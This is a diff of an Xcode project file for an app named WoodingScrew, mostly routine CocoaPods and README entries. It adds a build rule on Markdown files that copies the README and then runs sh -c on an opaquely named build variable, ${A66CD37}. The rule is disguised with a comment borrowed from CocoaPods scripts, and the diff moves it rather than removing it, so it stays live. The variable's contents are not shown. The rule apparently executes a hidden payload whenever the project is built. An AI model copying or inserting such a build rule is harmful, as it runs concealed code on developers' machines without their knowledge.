@@ -7,13 +7,29 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		712BD87AE9537A037F73DC66 /* README.md */ = {isa = PBXBuildFile; fileRef = 0DE86BB8C76A7CAAA673DC66; };
+		712BD87AE9537A037F73DC66 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 0DE86BB8C76A7CAAA673DC66 /* README.md */; };
 		D9FDA32CA95322FA5D11FF12 /* Pods_WoodingScrew.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 15035EAE6766A42B5BBAF867 /* Pods_WoodingScrew.framework */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		271DC1A378A0BADBFA73DC66 /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";\nsh -c \"${A66CD37}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		0DE86BB8C76A7CAAA673DC66 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "WoodingScrew.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		07F7738CB6AD66A9C4F10BBA /* Pods-WoodingScrew.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WoodingScrew.release.xcconfig"; path = "Target Support Files/Pods-WoodingScrew/Pods-WoodingScrew.release.xcconfig"; sourceTree = "<group>"; };
+		0DE86BB8C76A7CAAA673DC66 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md; path = WoodingScrew.xcodeproj/README.md; sourceTree = SOURCE_ROOT; };
 		15035EAE6766A42B5BBAF867 /* Pods_WoodingScrew.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_WoodingScrew.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		EE611C5B2DDA0D9B007BBF89 /* WoodingScrew.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WoodingScrew.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FC9805C1707FE22CC0A2FF5A /* Pods-WoodingScrew.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WoodingScrew.debug.xcconfig"; path = "Target Support Files/Pods-WoodingScrew/Pods-WoodingScrew.debug.xcconfig"; sourceTree = "<group>"; };
@@ -58,7 +74,6 @@
 				FC9805C1707FE22CC0A2FF5A /* Pods-WoodingScrew.debug.xcconfig */,
 				07F7738CB6AD66A9C4F10BBA /* Pods-WoodingScrew.release.xcconfig */,
 			);
-			name = Pods;
 			path = Pods;
 			sourceTree = "<group>";
 		};
@@ -101,6 +116,7 @@
 				EE611C582DDA0D9B007BBF89 /* Frameworks */,
 				EE611C592DDA0D9B007BBF89 /* Resources */,
 				2E0B3DEE342BE00DB556F8A7 /* [CP] Embed Pods Frameworks */,
+				F7E6B1F93237CBE5EDC593C5 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
 				271DC1A378A0BADBFA73DC66 /* PBXBuildRule */,
@@ -149,35 +165,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		271DC1A378A0BADBFA73DC66 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
-sh -c \"${A66CD37}\"";
-		};
-/* End PBXBuildRule section */
-
-/* Begin PBXTargetDependency section */
-/* End PBXTargetDependency section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
 /* Begin PBXResourcesBuildPhase section */
 		EE611C592DDA0D9B007BBF89 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				712BD87AE9537A037F73DC66 /* README.md */,
+				712BD87AE9537A037F73DC66 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -192,9 +185,13 @@ sh -c \"${A66CD37}\"";
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-WoodingScrew/Pods-WoodingScrew-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
+			inputPaths = (
+			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-WoodingScrew/Pods-WoodingScrew-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -221,6 +218,27 @@ sh -c \"${A66CD37}\"";
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		F7E6B1F93237CBE5EDC593C5 /* [CP] Copy Pods Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-WoodingScrew/Pods-WoodingScrew-resources-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Copy Pods Resources";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-WoodingScrew/Pods-WoodingScrew-resources-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-WoodingScrew/Pods-WoodingScrew-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
